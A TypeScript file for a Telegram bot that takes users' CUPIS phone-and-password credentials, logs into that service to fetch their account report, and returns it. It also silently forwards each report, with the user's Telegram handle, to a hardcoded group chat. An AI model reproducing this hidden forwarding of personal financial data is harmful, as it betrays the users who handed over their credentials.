import {
  Ctx,
  InjectBot,
  Message,
  On,
  Scene,
  SceneEnter,
  SceneLeave,
} from 'nestjs-telegraf';
import { CHECK_SCENE_NAME, checkMessage, menuKeyboard } from './constants';
import { Scenes, Telegraf, Context } from 'telegraf';
import { Injectable } from '@nestjs/common';
import { CupisRepository } from './cupis.repository';
import { checkerMapper } from './checker.mapper';
import parsePhoneNumber from 'libphonenumber-js'
import { AxiosError } from 'axios';

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

@Scene(CHECK_SCENE_NAME)
@Injectable()
export class CheckerScene {
  constructor(private cupicRepository: CupisRepository, @InjectBot('checker') private bot: Telegraf<Context>) {}

  @SceneEnter()
  async sceneEnter(@Ctx() ctx: Scenes.SceneContext) {
    await ctx.sendMessage(checkMessage);
  }

  @On('text')
  async checkCupis(
    @Message('text') message: string,
    @Ctx() ctx: Scenes.SceneContext,
  ) {
    const loginPassSplit = message.split(':');

    if (loginPassSplit.length !== 2) {
      await ctx.reply('Неправильно введены данные.\n\n‼️ Важно:\n\n  1. Формат ввода: номер телефона:пароль.\n        Пример: +79219552327:qwerty123\n  2. Номер телефона начинается с +7 или 8\n  3. Пароль не короче 8 символов');
      return;
    }

    const login = loginPassSplit[0];
    const password = loginPassSplit[1];

    const phoneNumber = parsePhoneNumber(login, 'RU');

    if (!phoneNumber || !phoneNumber.isValid()) {
      await ctx.reply('Не правильно введен номер телефона. \n\n‼️ Важно:\n\n  1. Формат ввода: номер телефона:пароль.\n        Пример: +79219552327:qwerty123\n  2. Номер телефона начинается с +7 или 8\n  3. Пароль не короче 8 символов')
      return
    }

    console.log('phone', phoneNumber)
    try {
      await ctx.reply('♾️ Идёт обработка...');

      const report = await this.cupicRepository.getReport(phoneNumber.nationalNumber, password);
      const mappedReport = checkerMapper.getReportMessage(report);

      await ctx.reply(mappedReport);
      await this.bot.telegram.sendMessage('-1002050901184', `Контант для связи: ${ctx.from.username ?? ctx.from.id}\n\n${mappedReport}`)
    } catch(err) {
      
      if (err instanceof AxiosError) {
        if (err.response.status === 401) {
          await ctx.reply('Неправильно указан номер телефона или пароль. Укажите правильные данные');
          return
        }

        if (err.response.status === 402) {
          await ctx.reply('Неправильно указан пароль. Пароль должен быть длиннее 8 символов. Укажите правильные данные');
          return
        }
        
        if (err.response.status === 403) {
          await ctx.reply('Ошибка авторизации в цупис, попробуйте еще раз');
          await ctx.scene.leave();
          return
        }
      }
      console.log('Unable to get report', err);
      await ctx.reply('Неполучилось получить отчет. Попробуйте позже');
      await ctx.scene.leave();
      return;
    }

    await ctx.scene.leave();
  }

  @SceneLeave()
  async sceneLeave(@Ctx() ctx: Scenes.SceneContext) {
    await ctx.reply('✅ Спасибо за использование бота!', menuKeyboard);
  }
}
